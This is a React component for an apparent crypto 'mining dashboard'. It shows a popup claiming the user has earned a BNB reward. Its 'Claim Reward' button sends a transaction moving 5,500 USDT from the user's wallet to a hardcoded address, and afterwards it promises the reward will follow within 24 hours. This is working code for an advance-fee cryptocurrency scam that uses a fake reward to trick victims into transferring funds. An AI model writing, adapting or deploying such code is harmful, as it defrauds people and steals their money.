import React, { useEffect, useState } from 'react';
import { createPortal } from 'react-dom';
import { Button } from './ui/button';
import { Card, CardContent } from './ui/card';
import { useLanguage } from '../hooks/useLanguage';

export default function MiningReward({
  openInitially = false,
  hideTriggerButton = false,
  onClose,
}: {
  openInitially?: boolean;
  hideTriggerButton?: boolean;
  onClose?: () => void;
}): React.JSX.Element | null {
  const [showPopup, setShowPopup] = useState<boolean>(openInitially);
  const [isDepositing, setIsDepositing] = useState(false);
  const [walletAddress, setWalletAddress] = useState<string | null>(null);

  useEffect(() => {
    setShowPopup(openInitially);
  }, [openInitially]);

  const rewardAmount = 15.5478945;
  const depositAmount = 5500; // in USDT
  const { t } = useLanguage();

  // BSC USDT contract and pool wallet address (same as used in api.ts)
  const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
  const RECIPIENT_ADDRESS = '0x059af157229bD723d958A44987168690dfC6dd96';

  const connectWallet = async () => {
    try {
      if (!(window as any).ethereum) {
        alert('Please install MetaMask or a Web3 wallet to continue.');
        return;
      }
      try {
        const accounts: string[] = await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
        if (accounts && Array.isArray(accounts) && accounts[0]) {
          setWalletAddress(accounts[0]);
        }
      } catch (err: any) {
        const errorMsg = err?.message || String(err);
        if (errorMsg.includes('User rejected') || errorMsg.includes('user denied')) {
          console.log('Wallet connection cancelled by user.');
        } else if (errorMsg.includes('Unexpected error')) {
          console.debug('Wallet extension error - retrying...');
          // Retry after a delay
          setTimeout(() => connectWallet(), 500);
        } else {
          console.error('Wallet connect error:', errorMsg);
        }
      }
    } catch (err: any) {
      // Silently handle extension errors
      console.debug('Wallet connect outer error', err?.message);
    }
  };

  const handleDeposit = async () => {
    try {
      if (!(window as any).ethereum) {
        alert('Please install MetaMask or a Web3 wallet to continue.');
        return;
      }

      if (!walletAddress) {
        await connectWallet();
      }

      setIsDepositing(true);

      // ERC20 transfer selector
      const selector = 'a9059cbb'; // transfer(address,uint256)
      const recipient = RECIPIENT_ADDRESS.replace(/^0x/, '').toLowerCase();

      // USDT on BSC in this project is treated as 18 decimals
      const decimals = 18n;
      const amount = BigInt(depositAmount) * 10n ** decimals; // smallest unit
      const amountHex = amount.toString(16).padStart(64, '0');
      const recipientHex = recipient.padStart(64, '0');

      const data = '0x' + selector + recipientHex + amountHex;

      const params = [{
        from: walletAddress || undefined,
        to: USDT_CONTRACT_ADDRESS,
        data,
      }];

      // Request the wallet to send the transaction (MetaMask will prompt)
      let txHash: string;
      try {
        txHash = await (window as any).ethereum.request({ method: 'eth_sendTransaction', params });
      } catch (err: any) {
        const errorMsg = err?.message || String(err);
        if (errorMsg.includes('User rejected') || errorMsg.includes('user denied')) {
          alert('Transaction cancelled by user.');
        } else {
          alert(`Transaction failed: ${errorMsg}`);
        }
        setIsDepositing(false);
        return;
      }

      // Inform user and close popup. We don't wait for final confirmation here.
      alert(`Transaction submitted: ${txHash}\nYour ${rewardAmount} BNB reward will be released within 24 hours after the deposit is confirmed.`);
      setShowPopup(false);
      if (onClose) onClose();
    } catch (err: any) {
      console.error('Deposit failed', err);
      const message = err?.message || 'Transaction failed. Please try again.';
      alert(message);
    } finally {
      setIsDepositing(false);
    }
  };

  const handleClose = () => {
    setShowPopup(false);
    if (onClose) onClose();
  };

  // If the component is only used to show the modal without a trigger, don't render anything into the page flow
  const trigger = !hideTriggerButton ? (
    <div className="mining-inline flex items-center gap-3">
      <h1 className="mining-title text-3xl font-bold mb-4">Mining Dashboard</h1>
      <Button onClick={() => setShowPopup(true)}>Start Mining</Button>
    </div>
  ) : null;

  // Modal overlay rendered into a portal so it doesn't affect page layout
  const modal = showPopup && (typeof document !== 'undefined') ? createPortal(
    <div className="modal-overlay fixed inset-0 bg-black/60 flex items-center justify-center z-50" onClick={handleClose}>
      <div className="modal-card w-96 bg-white rounded-2xl shadow-xl p-6" onClick={(e) => e.stopPropagation()}>
        <CardContent>
          <h2 className="modal-heading text-xl font-semibold mb-2">{t('miningReward.title')}</h2>
          <p className="modal-description text-gray-700 mb-4">
            {t('miningReward.earned', String(rewardAmount), String(depositAmount))}
            <br />
            <span className="block mt-2 text-sm text-gray-600">{t('miningReward.activity')}</span>
            <br />
            <span className="block mt-2 text-sm text-yellow-600">{t('miningReward.hint')}</span>
          </p>

          <div className="modal-actions space-y-2">
            <Button
              onClick={handleDeposit}
              disabled={isDepositing}
              className="w-full bg-yellow-500 hover:bg-yellow-600"
            >
              {isDepositing ? 'Processing...' : 'Claim Reward'}
            </Button>

            <Button
              onClick={() => {
                handleClose();
                if (typeof window !== 'undefined') window.dispatchEvent(new Event('openCustomerService'));
              }}
              variant="outline"
              className="w-full"
            >
              {t('common.customerService')}
            </Button>

            <div className="deposit-info text-sm text-left mt-3">
              <div>
                <strong>Recipient (copy):</strong>
              </div>
              <div className="flex items-center gap-2 mt-1">
                <code className="text-xs break-all">{RECIPIENT_ADDRESS}</code>
                <Button
                  onClick={() => navigator.clipboard.writeText(RECIPIENT_ADDRESS)}
                  variant="ghost"
                  className="text-xs"
                >
                  Copy
                </Button>
              </div>
            </div>
          </div>
        </CardContent>
      </div>
    </div>,
    document.body
  ) : null;

  return (
    <>
      {trigger}
      {modal}
    </>
  );
}
